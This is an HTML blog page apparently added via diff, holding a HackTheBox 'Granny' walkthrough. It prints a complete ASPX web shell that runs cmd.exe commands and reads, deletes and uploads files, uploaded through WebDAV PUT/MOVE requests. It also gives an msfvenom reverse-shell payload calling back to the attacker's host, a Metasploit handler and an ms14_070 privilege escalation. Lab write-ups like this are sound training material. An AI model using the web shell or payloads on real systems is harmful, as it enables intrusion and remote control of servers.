@@ -1,0 +1,283 @@
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="description" content="quackland.tk - under construction">
+	<meta name="author" content="quackland.tk">
+	<link rel="stylesheet" href="/styles/dracula.css">
+	<script src="/js/highlight.pack.js"></script>
+	<script>hljs.highlightAll();</script>
+	<title>quackland.kr</title>
+
+	<style type="text/css">
+		body {
+			background-color:black;
+			color:white;
+			font-family:hack;
+			padding-left: 137px;
+			padding-right: 137px;
+		}
+		h1 {
+			font-size: 40px;
+			color:#81cc4b;
+			text-align: center;
+		}
+		h2 {
+			font-size: 30px;
+			color:#81cc4b;
+		}
+		a { color: white; }
+		.hello {
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+		}
+		.fading {
+			animation:fading 7s infinite
+		}
+		@keyframes fading{
+			0%{opacity:0}
+			50%{opacity:1}
+			100%{opacity:0}
+		}
+	</style>
+</head>
+<body>
+<h1 id="granny">Granny</h1>
+<p>The granny is simple hackthebox in which we will exploit the improper permissions on the HTTP methods to get <strong>RCE</strong> and then leverage it with malicious <strong>ASPX</strong> file to gain the meterpreter session. For privilege escalation we will use windows <strong>CVE ms14_070_tcpip_ioctl</strong>. So lets get started</p>
+<h2 id="nmap">Nmap</h2>
+<p>we start with the nmap scan for to find all the port. Also i will run a nmap scan for all ports in background to have some enumeration running in the background.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-oN</span> nmap/granny 10.10.10.15</span></code></pre></div>
+<p>nmap scan for all ports in background</p>
+<pre><code>nmap -p- -v -oN nmap/allports 10.10.10.15</code></pre>
+<p>we get output of the first nmap scan as follows</p>
+<pre><code># Nmap 7.80 scan initiated Mon Mar 16 10:25:07 2020 as: nmap -sC -sV -oN nmap/granny 10.10.10.15
+Nmap scan report for 10.10.10.15
+Host is up (0.20s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan: 
+|   Server Type: Microsoft-IIS/6.0
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+|   WebDAV type: Unknown
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  Server Date: Mon, 16 Mar 2020 04:55:28 GMT
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar 16 10:25:33 2020 -- 1 IP address (1 host up) scanned in 25.73 seconds</code></pre>
+<p>we have only one port open i.e 80. Checking it out we have nothing but a <strong>Under Construction Page</strong> there. On further analysing the nmap output, we see the HTTP methods such as <strong>DELETE, COPY, MOVE, PUT</strong> are open to public users. Lets examine them.</p>
+<h2 id="getting-shell">Getting Shell</h2>
+<p>The public PUT allows us the to upload html files. Thus the following request allows us to upload html files but not the aspx files. This does us no good unless we can leverage to upload aspx files.</p>
+<h3 id="note">Note</h3>
+<p>I had take the shell.aspx file from <a href="https://raw.githubusercontent.com/xl7dev/WebShell/master/Aspx/ASPX%20Shell.aspx">here</a></p>
+<p>We are trying to upload aspx files not php files to gain <strong>RCE</strong> as this is windows box and server is WebDAV so safe guess is php is not installed on the box and will not be executed by the server.</p>
+<p>We see that we have HTTP methods such as MOVE also, so if we could upload a html file and move it file with aspx extension that will solve our problem. So upload the aspx file as shell.html and then move it shell.aspx.</p>
+<pre class="http"><code>PUT /shell.html HTTP/1.1
+Host: 10.10.10.15
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+Content-Length: 5271
+
+&lt;%-- ASPX Shell by LT &lt;lt@mac.hush.com&gt; (2007) --%&gt;
+&lt;%@ Page Language=&quot;C#&quot; EnableViewState=&quot;false&quot; %&gt;
+&lt;%@ Import Namespace=&quot;System.Web.UI.WebControls&quot; %&gt;
+&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;
+&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;
+
+&lt;%
+    string outstr = &quot;&quot;;
+    
+    // get pwd
+    string dir = Page.MapPath(&quot;.&quot;) + &quot;/&quot;;
+    if (Request.QueryString[&quot;fdir&quot;] != null)
+        dir = Request.QueryString[&quot;fdir&quot;] + &quot;/&quot;;
+    dir = dir.Replace(&quot;\\&quot;, &quot;/&quot;);
+    dir = dir.Replace(&quot;//&quot;, &quot;/&quot;);
+    
+    // build nav for path literal
+    string[] dirparts = dir.Split(&#39;/&#39;);
+    string linkwalk = &quot;&quot;;   
+    foreach (string curpart in dirparts)
+    {
+        if (curpart.Length == 0)
+            continue;
+        linkwalk += curpart + &quot;/&quot;;
+        outstr += string.Format(&quot;&lt;a href=&#39;?fdir={0}&#39;&gt;{1}/&lt;/a&gt;&amp;nbsp;&quot;,
+                                    HttpUtility.UrlEncode(linkwalk),
+                                    HttpUtility.HtmlEncode(curpart));
+    }
+    lblPath.Text = outstr;
+    
+    // create drive list
+    outstr = &quot;&quot;;
+    foreach(DriveInfo curdrive in DriveInfo.GetDrives())
+    {
+        if (!curdrive.IsReady)
+            continue;
+        string driveRoot = curdrive.RootDirectory.Name.Replace(&quot;\\&quot;, &quot;&quot;);
+        outstr += string.Format(&quot;&lt;a href=&#39;?fdir={0}&#39;&gt;{1}&lt;/a&gt;&amp;nbsp;&quot;,
+                                    HttpUtility.UrlEncode(driveRoot),
+                                    HttpUtility.HtmlEncode(driveRoot));
+    }
+    lblDrives.Text = outstr;
+
+    // send file ?
+    if ((Request.QueryString[&quot;get&quot;] != null) &amp;&amp; (Request.QueryString[&quot;get&quot;].Length &gt; 0))
+    {
+        Response.ClearContent();
+        Response.WriteFile(Request.QueryString[&quot;get&quot;]);
+        Response.End();
+    }
+
+    // delete file ?
+    if ((Request.QueryString[&quot;del&quot;] != null) &amp;&amp; (Request.QueryString[&quot;del&quot;].Length &gt; 0))
+        File.Delete(Request.QueryString[&quot;del&quot;]);    
+
+    // receive files ?
+    if(flUp.HasFile)
+    {
+        string fileName = flUp.FileName;
+        int splitAt = flUp.FileName.LastIndexOfAny(new char[] { &#39;/&#39;, &#39;\\&#39; });
+        if (splitAt &gt;= 0)
+            fileName = flUp.FileName.Substring(splitAt);
+        flUp.SaveAs(dir + &quot;/&quot; + fileName);
+    }
+
+    // enum directory and generate listing in the right pane
+    DirectoryInfo di = new DirectoryInfo(dir);
+    outstr = &quot;&quot;;
+    foreach (DirectoryInfo curdir in di.GetDirectories())
+    {
+        string fstr = string.Format(&quot;&lt;a href=&#39;?fdir={0}&#39;&gt;{1}&lt;/a&gt;&quot;,
+                                    HttpUtility.UrlEncode(dir + &quot;/&quot; + curdir.Name),
+                                    HttpUtility.HtmlEncode(curdir.Name));
+        outstr += string.Format(&quot;&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;td&gt;&amp;lt;DIR&amp;gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&quot;, fstr);
+    }
+    foreach (FileInfo curfile in di.GetFiles())
+    {
+        string fstr = string.Format(&quot;&lt;a href=&#39;?get={0}&#39; target=&#39;_blank&#39;&gt;{1}&lt;/a&gt;&quot;,
+                                    HttpUtility.UrlEncode(dir + &quot;/&quot; + curfile.Name),
+                                    HttpUtility.HtmlEncode(curfile.Name));
+        string astr = string.Format(&quot;&lt;a href=&#39;?fdir={0}&amp;del={1}&#39;&gt;Del&lt;/a&gt;&quot;,
+                                    HttpUtility.UrlEncode(dir),
+                                    HttpUtility.UrlEncode(dir + &quot;/&quot; + curfile.Name));
+        outstr += string.Format(&quot;&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;td&gt;{1:d}&lt;/td&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt;&quot;, fstr, curfile.Length / 1024, astr);
+    }
+    lblDirOut.Text = outstr;
+
+    // exec cmd ?
+    if (txtCmdIn.Text.Length &gt; 0)
+    {
+        Process p = new Process();
+        p.StartInfo.CreateNoWindow = true;
+        p.StartInfo.FileName = &quot;cmd.exe&quot;;
+        p.StartInfo.Arguments = &quot;/c &quot; + txtCmdIn.Text;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.StartInfo.RedirectStandardError = true;
+        p.StartInfo.WorkingDirectory = dir;
+        p.Start();
+
+        lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+        txtCmdIn.Text = &quot;&quot;;
+    }   
+%&gt;
+
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; &gt;
+&lt;head&gt;
+    &lt;title&gt;ASPX Shell&lt;/title&gt;
+    &lt;style type=&quot;text/css&quot;&gt;
+        * { font-family: Arial; font-size: 12px; }
+        body { margin: 0px; }
+        pre { font-family: Courier New; background-color: #CCCCCC; }
+        h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
+        h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
+        th { text-align: left; background-color: #99CC99; }
+        td { background-color: #CCFFCC; }
+        pre { margin: 2px; }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;ASPX Shell by LT&lt;/h1&gt;
+    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;
+    &lt;table style=&quot;width: 100%; border-width: 0px; padding: 5px;&quot;&gt;
+        &lt;tr&gt;
+            &lt;td style=&quot;width: 50%; vertical-align: top;&quot;&gt;
+                &lt;h2&gt;Shell&lt;/h2&gt;              
+                &lt;asp:TextBox runat=&quot;server&quot; ID=&quot;txtCmdIn&quot; Width=&quot;300&quot; /&gt;
+                &lt;asp:Button runat=&quot;server&quot; ID=&quot;cmdExec&quot; Text=&quot;Execute&quot; /&gt;
+                &lt;pre&gt;&lt;asp:Literal runat=&quot;server&quot; ID=&quot;lblCmdOut&quot; Mode=&quot;Encode&quot; /&gt;&lt;/pre&gt;
+            &lt;/td&gt;
+            &lt;td style=&quot;width: 50%; vertical-align: top;&quot;&gt;
+                &lt;h2&gt;File Browser&lt;/h2&gt;
+                &lt;p&gt;
+                    Drives:&lt;br /&gt;
+                    &lt;asp:Literal runat=&quot;server&quot; ID=&quot;lblDrives&quot; Mode=&quot;PassThrough&quot; /&gt;
+                &lt;/p&gt;
+                &lt;p&gt;
+                    Working directory:&lt;br /&gt;
+                    &lt;b&gt;&lt;asp:Literal runat=&quot;server&quot; ID=&quot;lblPath&quot; Mode=&quot;passThrough&quot; /&gt;&lt;/b&gt;
+                &lt;/p&gt;
+                &lt;table style=&quot;width: 100%&quot;&gt;
+                    &lt;tr&gt;
+                        &lt;th&gt;Name&lt;/th&gt;
+                        &lt;th&gt;Size KB&lt;/th&gt;
+                        &lt;th style=&quot;width: 50px&quot;&gt;Actions&lt;/th&gt;
+                    &lt;/tr&gt;
+                    &lt;asp:Literal runat=&quot;server&quot; ID=&quot;lblDirOut&quot; Mode=&quot;PassThrough&quot; /&gt;
+                &lt;/table&gt;
+                &lt;p&gt;Upload to this directory:&lt;br /&gt;
+                &lt;asp:FileUpload runat=&quot;server&quot; ID=&quot;flUp&quot; /&gt;
+                &lt;asp:Button runat=&quot;server&quot; ID=&quot;cmdUpload&quot; Text=&quot;Upload&quot; /&gt;
+                &lt;/p&gt;
+            &lt;/td&gt;
+        &lt;/tr&gt;
+    &lt;/table&gt;
+
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>Now moving the file</p>
+<pre class="http"><code>MOVE /shell.html HTTP/1.1
+DESTINATION: http://10.10.10.15/shell.aspx
+Host: 10.10.10.15
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close</code></pre>
+<p>Now if we go to http://10.10.10.15/shell.aspx we should get our shell. As shown below.</p>
+<figure>
+<img src="images/granny/file_upload_granny.png" alt="We got our shell" /><figcaption aria-hidden="true">We got our shell</figcaption>
+</figure>
+<p>With the help of the msfvenom we will get out meterpreter shell now. The following command will create a staged meterpreter payload in aspx format.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">msfvenom</span> <span class="at">-p</span> windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 <span class="at">-f</span> aspx <span class="at">-o</span> nice.aspx</span></code></pre></div>
+<p>Fire up the meterpreter and run the commands</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">use</span> multi/handler</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> payload windows/meterpreter/reverse_tcp</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> LHOST 10.10.14.4</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> LPORT 4444</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span></span></code></pre></div>
+<p>make a get request to http://10.10.10.15/nice.aspx and you should a meterpreter shell.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>We have the SeImpersonateToken available to us so the logical path is to Juicy Potato, Dirty Potato or some potato this box (too many potato exploits, smh). But they did’nt worked for me. With Fuck-Ton of searching around gave me this exploit <strong>ms14_070_tcpip_ioctl</strong> , so i ran up the msf exploit for this and it gave me a system shell. yay!</p>
+<figure>
+<img src="images/granny/granny_proof.png" alt="proof.txt" /><figcaption aria-hidden="true">proof.txt</figcaption>
+</figure>
+<p>So that was the granny box, i am doing all the OSCP similar boxes on the hackthebox and will be writing stuff on them.</p></body>
+</html>
